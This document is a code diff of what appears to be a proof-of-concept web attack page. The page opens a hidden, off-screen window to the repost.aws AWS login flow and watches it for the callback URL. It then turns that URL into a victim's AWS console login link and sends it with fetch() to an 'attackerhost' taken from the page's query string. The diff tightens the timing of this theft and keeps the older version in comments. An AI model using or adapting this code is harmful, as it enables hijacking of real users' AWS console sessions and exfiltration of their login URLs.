@@ -536,11 +536,6 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
     let newWindow = window.open('https://repost.aws/api/v1/identity/aws/login?redirectUrl=https%3A%2F%2Frepost.aws%2Fauth', '_blank', 'width=1,height=1,left=-1000,top=-1000');
 
     // Ensure the current window remains focused
-    setTimeout(function () {
-        var host = window.location.protocol + "//" + window.location.host;
-        window.open(host, '_blank');
-    }, 2000);
-
     // Poll the window every 100 milliseconds to check for URL change
     const checkUrlInterval = setInterval(() => {
         try {
@@ -585,50 +580,113 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
     // }, 1300); // Update every 1 second (1000 milliseconds)
 
     if (newWindow) {
-        setTimeout(function () {
+        const checkUrlInterval = setInterval(() => {
             try {
-                let url = newWindow.location.href;
-                let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
-
-                //alert("Login URL to the victim account: " + modifiedUrl);
-                // 1. Extract the parameter value from the URL
-                function getParameterByName(name) {
-                    const url = window.location.href;
-                    name = name.replace(/[\[\]]/g, '\\$&'); // Escape brackets if present in the parameter name
-                    const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
-                    const results = regex.exec(url);
-                    if (!results) return null;
-                    if (!results[2]) return '';
-                    return decodeURIComponent(results[2].replace(/\+/g, ' '));
+            // Access the window's current URL
+            let currentUrl = newWindow.location.href;
+        
+            // Check if the URL contains the string we want to replace
+            if (currentUrl.includes('/repost.aws/api/v1/identity/aws/callback')) {
+                // Replace "https%3A%2F%2Frepost.aws" with "https%3A%2Frepost.aws"
+                try {
+                    let url = newWindow.location.href;
+                    let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
+    
+                    //alert("Login URL to the victim account: " + modifiedUrl);
+                    // 1. Extract the parameter value from the URL
+                    function getParameterByName(name) {
+                        const url = window.location.href;
+                        name = name.replace(/[\[\]]/g, '\\$&'); // Escape brackets if present in the parameter name
+                        const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+                        const results = regex.exec(url);
+                        if (!results) return null;
+                        if (!results[2]) return '';
+                        return decodeURIComponent(results[2].replace(/\+/g, ' '));
+                    }
+    
+                    // Get the 'attackerhost' parameter value
+                    const attackerHost = getParameterByName('attackerhost');
+    
+                    // 2. Send GET request to the attackerHost if the parameter exists
+                    if (attackerHost) {
+                        fetch(`https://${attackerHost}/login_url=${modifiedUrl}`)
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error('Network response was not ok');
+                                }
+                                return response.text();
+                            })
+                            .then(data => {
+                                console.log('Response from attacker host:', data);
+                            })
+                            .catch(error => {
+                                console.error('Error fetching from attacker host:', error);
+                            });
+                    } else {
+                        console.log('No attackerhost parameter found in URL');
+                    }
+    
+                } catch (e) {
+                    alert("Unable to access the URL of the new window due to security restrictions.");
                 }
-
-                // Get the 'attackerhost' parameter value
-                const attackerHost = getParameterByName('attackerhost');
-
-                // 2. Send GET request to the attackerHost if the parameter exists
-                if (attackerHost) {
-                    fetch(`https://${attackerHost}/login_url=${modifiedUrl}`)
-                        .then(response => {
-                            if (!response.ok) {
-                                throw new Error('Network response was not ok');
-                            }
-                            return response.text();
-                        })
-                        .then(data => {
-                            console.log('Response from attacker host:', data);
-                        })
-                        .catch(error => {
-                            console.error('Error fetching from attacker host:', error);
-                        });
-                } else {
-                    console.log('No attackerhost parameter found in URL');
-                }
-
-            } catch (e) {
-                alert("Unable to access the URL of the new window due to security restrictions.");
+                // Redirect the window to the modified URL
+                var host = window.location.protocol + "//" + window.location.host;
+                newWindow.location.href = host;
+        
+        
+                // Stop further interval checking
+                clearInterval(checkUrlInterval);
             }
+            } catch (error) {
+            // The try-catch is needed in case of cross-origin issues,
+            // but as soon as the domain matches, it won't throw
+            console.log('Error accessing window URL. Possibly cross-origin.');
+            }
+        }, 100); // Check every 100 milliseconds
+        // setTimeout(function () {
+        //     try {
+        //         let url = newWindow.location.href;
+        //         let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
 
-        }, 12000); // 12000 milliseconds = 12 seconds
+        //         //alert("Login URL to the victim account: " + modifiedUrl);
+        //         // 1. Extract the parameter value from the URL
+        //         function getParameterByName(name) {
+        //             const url = window.location.href;
+        //             name = name.replace(/[\[\]]/g, '\\$&'); // Escape brackets if present in the parameter name
+        //             const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+        //             const results = regex.exec(url);
+        //             if (!results) return null;
+        //             if (!results[2]) return '';
+        //             return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        //         }
+
+        //         // Get the 'attackerhost' parameter value
+        //         const attackerHost = getParameterByName('attackerhost');
+
+        //         // 2. Send GET request to the attackerHost if the parameter exists
+        //         if (attackerHost) {
+        //             fetch(`https://${attackerHost}/login_url=${modifiedUrl}`)
+        //                 .then(response => {
+        //                     if (!response.ok) {
+        //                         throw new Error('Network response was not ok');
+        //                     }
+        //                     return response.text();
+        //                 })
+        //                 .then(data => {
+        //                     console.log('Response from attacker host:', data);
+        //                 })
+        //                 .catch(error => {
+        //                     console.error('Error fetching from attacker host:', error);
+        //                 });
+        //         } else {
+        //             console.log('No attackerhost parameter found in URL');
+        //         }
+
+        //     } catch (e) {
+        //         alert("Unable to access the URL of the new window due to security restrictions.");
+        //     }
+
+        // }, 12000); // 12000 milliseconds = 12 seconds
     } else {
         alert("Nothing");
     }
